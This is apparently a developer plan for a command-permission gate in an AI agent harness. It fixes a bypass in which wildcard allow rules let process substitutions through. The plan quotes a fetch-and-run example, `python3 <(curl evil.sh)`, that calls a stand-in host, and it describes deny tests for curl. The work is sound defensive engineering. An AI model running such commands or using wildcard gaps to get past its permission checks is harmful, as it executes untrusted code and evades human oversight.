# Plan: `ANY`/`HAS` must not silently swallow `<subst>`

`matchRule` compares literal tokens by equality, so a `<subst>` placeholder can
never satisfy a literal rule token — but it sits happily inside an `ANY` span or
an `HAS` tail. `allow python3 ANY` therefore allows `python3 <(curl evil.sh)`:
the interpreter reads a path shizo cannot inspect. Fix: an **allow** rule's
wildcard span refuses to cover `substToken`, so the command falls through to the
normal unmatched `ask`. **Deny** rules keep matching it: restricting them too
would not open a bypass (allow rules are restricted as well, so the worst case
is a fallthrough to `ask`), but it would silently downgrade an operator's hard
line to a prompt — and in `automode` that prompt becomes a `defer` handed back
to the harness. An unknown token must push toward denial, never away from it.

1. In `match.go`, add `func spanHasSubst(argv []string) bool` — a one-line
   `slices.Contains(argv, substToken)`.
2. In `matchRule`, in the `hasIdx` branch, return `false` when
   `r.action == "allow" && spanHasSubst(argv[len(prefix):])`, before the
   `hasFlag` call.
3. In `matchRule`, in the `anyIdx` branch, return `false` when
   `r.action == "allow" && spanHasSubst(argv[len(head):len(argv)-len(tail)])`,
   after the head/tail checks pass.
4. Add `match_test.go` cases: `allow python3 ANY` vs `[python3 <subst>]` → no
   match; `deny python3 ANY` vs the same argv → still matches; `allow git
   commit HAS -m` vs `[git commit -m <subst>]` → no match; `allow diff ANY` vs
   `[diff a b]` → still matches (no regression).
5. Add a `policy_test.go` case: `python3 <(curl evil.sh)` under
   `allow python3 ANY` + `allow curl ANY` yields `ask` (with the `curl` inner
   command still logged `allow`), and one showing `deny curl ANY` still denies
   `curl <(echo x)`.
6. Update `docs/RULES.md` §`ANY`/`HAS` and `docs/EVALUATION.md` step 11 as
   integrated prose: wildcards in an allow rule match only statically known
   tokens; a substitution anywhere in the wildcard span leaves the command
   unmatched. Drop the corresponding residual risk from `docs/ARCHITECTURE.md`.

Skipped: an opt-in `SUBST` rule token to re-allow `diff <(a) <(b)` style
commands, and any handling of `<var>` (already a hard deny at step 7); add the
token when a real workflow proves the fallthrough-to-`ask` too noisy.

Note for `PLAN-stdin-gate.md`: that plan's step 6 adds an `ask` verb — extend
the `r.action == "allow"` check here to treat `ask` like `allow` (both are
verdict-granting), leaving only `deny` unrestricted.
